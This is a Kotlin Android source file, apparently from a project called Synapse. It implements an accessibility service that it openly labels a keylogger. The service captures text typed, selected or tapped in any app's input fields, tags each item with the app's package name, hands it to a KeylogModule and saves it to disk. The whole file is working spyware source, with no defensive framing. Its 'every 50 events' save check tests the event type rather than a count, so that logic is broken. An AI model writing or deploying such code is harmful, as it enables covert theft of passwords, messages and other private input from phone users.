package org.synapse.core.modules

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

/**
 * AccessibilityService that captures keystrokes and typed text
 * from any app's input fields. Feeds into KeylogModule.
 *
 * MUST be manually enabled by user in:
 * Settings → Accessibility → Synapse Keylogger
 */
class SynapseAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "Synapse.Accessibility"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        KeylogModule.hasActiveSession = true
        Log.d(TAG, "Accessibility service connected — keylogger active")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        // Capture text from various event types
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                val text = event.text?.joinToString(" ") ?: return
                if (text.isNotBlank()) {
                    KeylogModule.onKeyEvent(packageName, text)
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val text = event.text?.joinToString(" ") ?: ""
                if (text.isNotBlank()) {
                    KeylogModule.onKeyEvent(packageName, "[TAP] $text")
                }
            }
        }

        // Periodic persistence every 50 events
        if (event.eventType % 50 == 0) {
            KeylogModule.persistToDisk(applicationContext)
        }
    }

    override fun onInterrupt() {
        KeylogModule.persistToDisk(applicationContext)
        KeylogModule.hasActiveSession = false
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        KeylogModule.persistToDisk(applicationContext)
        KeylogModule.hasActiveSession = false
        super.onDestroy()
        Log.d(TAG, "Accessibility service destroyed — keylogger stopped")
    }
}
